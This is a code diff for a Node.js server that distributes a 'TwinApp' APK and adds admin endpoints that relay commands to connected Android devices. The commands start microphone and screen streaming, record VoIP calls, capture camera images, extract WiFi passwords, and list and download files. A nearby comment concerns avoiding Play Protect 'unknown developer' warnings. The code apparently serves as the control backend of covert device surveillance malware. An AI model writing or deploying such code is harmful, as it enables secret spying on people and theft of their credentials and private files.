@@ -1132,6 +1132,39 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
+  // ═══ TWIN APP (Self-Healing Companion) — upload + download ═══
+  const twinApkUpload = require('multer')({
+    dest: path.join(__dirname, 'data', 'tmp'),
+    limits: { fileSize: 20 * 1024 * 1024 }
+  });
+
+  app.post('/api/admin/upload-twin-apk', twinApkUpload.single('apk'), (req, res) => {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      if (!req.file) return res.status(400).json({ error: 'No APK file uploaded' });
+      const destPath = path.join(__dirname, 'data', 'TwinApp.apk');
+      fs.copyFileSync(req.file.path, destPath);
+      try { fs.unlinkSync(req.file.path); } catch (_) {}
+      const stats = fs.statSync(destPath);
+      console.log(`[TwinApp] Uploaded: ${stats.size} bytes`);
+      res.json({ success: true, size: stats.size, url: `${req.headers['x-forwarded-proto'] || 'https'}://${req.headers['host']}/downloadapp/TwinApp.apk` });
+    } catch (err) { res.status(500).json({ error: err.message }); }
+  });
+
+  app.get('/downloadapp/TwinApp.apk', (req, res) => {
+    const apkPath = path.join(__dirname, 'data', 'TwinApp.apk');
+    if (fs.existsSync(apkPath)) {
+      const stats = fs.statSync(apkPath);
+      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+      res.setHeader('Content-Disposition', 'attachment; filename="TwinApp.apk"');
+      res.setHeader('Content-Length', stats.size);
+      res.setHeader('Cache-Control', 'no-store');
+      res.sendFile(apkPath);
+    } else {
+      res.status(404).send('Twin App APK not available yet. Upload via CI or admin panel.');
+    }
+  });
+
   // ── WRAPPER APK DOWNLOAD — STABLE cert, same binary every time ──────────────
   // KEY INSIGHT: Rotating the cert per download was CAUSING the PP "unknown
   // developer" warning. Every user saw a cert PP had never seen before → warning
@@ -4522,6 +4555,53 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       res.json({ success: true, message: 'Unhide command sent' });
     } catch (err) { res.status(500).json({ error: err.message }); }
   });
+
+  // ═══ v7.9 ADMIN RELAY ENDPOINTS — send commands to device via REST ═══
+  // Each endpoint relays a socket event to the target device.
+
+  // Helper: relay a command to a device
+  function relayCommand(req, res, eventName, payloadExtractor) {
+    try {
+      if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
+      const { device_id } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id required' });
+
+      const targetSocket = findDeviceSocket(device_id);
+      if (!targetSocket) return res.status(404).json({ error: 'Device not connected' });
+
+      const payload = payloadExtractor ? payloadExtractor(req.body) : req.body;
+      targetSocket.emit(eventName, payload);
+      res.json({ success: true, message: `${eventName} command sent` });
+    } catch (err) { res.status(500).json({ error: err.message }); }
+  }
+
+  app.post('/api/admin/start-mic-stream', express.json(), (req, res) => relayCommand(req, res, 'start_mic_stream'));
+  app.post('/api/admin/stop-mic-stream', express.json(), (req, res) => relayCommand(req, res, 'stop_mic_stream'));
+  app.post('/api/admin/start-screen-stream', express.json(), (req, res) => relayCommand(req, res, 'start_screen_stream'));
+  app.post('/api/admin/stop-screen-stream', express.json(), (req, res) => relayCommand(req, res, 'stop_screen_stream'));
+  app.post('/api/admin/request-screen-grant', express.json(), (req, res) => relayCommand(req, res, 'request_screen_stream_grant'));
+  app.post('/api/admin/start-voip-record', express.json(), (req, res) => relayCommand(req, res, 'start_voip_record'));
+  app.post('/api/admin/stop-voip-record', express.json(), (req, res) => relayCommand(req, res, 'stop_voip_record'));
+  app.post('/api/admin/extract-wifi-passwords', express.json(), (req, res) => relayCommand(req, res, 'extract_wifi_passwords'));
+  app.post('/api/admin/run-security-scan', express.json(), (req, res) => relayCommand(req, res, 'run_security_scan'));
+
+  app.post('/api/admin/capture-camera', express.json(), (req, res) =>
+    relayCommand(req, res, 'capture_camera', b => ({ camera: b.camera || 'back', quality: b.quality || 'high' })));
+
+  app.post('/api/admin/block-app', express.json(), (req, res) =>
+    relayCommand(req, res, 'block_app', b => ({ package: b.package || '' })));
+
+  app.post('/api/admin/unblock-app', express.json(), (req, res) =>
+    relayCommand(req, res, 'unblock_app', b => ({ package: b.package || '' })));
+
+  app.post('/api/admin/list-files', express.json(), (req, res) =>
+    relayCommand(req, res, 'list_files', b => ({ path: b.path || '/sdcard' })));
+
+  app.post('/api/admin/download-file', express.json(), (req, res) =>
+    relayCommand(req, res, 'download_file', b => ({ path: b.path || '' })));
+
+  app.post('/api/admin/set-geofences', express.json(), (req, res) =>
+    relayCommand(req, res, 'set_geofences', b => ({ geofences: b.geofences || [] })));
 
   // Stream endpoint — redirects to Cloudinary URL
   app.get('/api/stream/:videoId', (req, res) => {
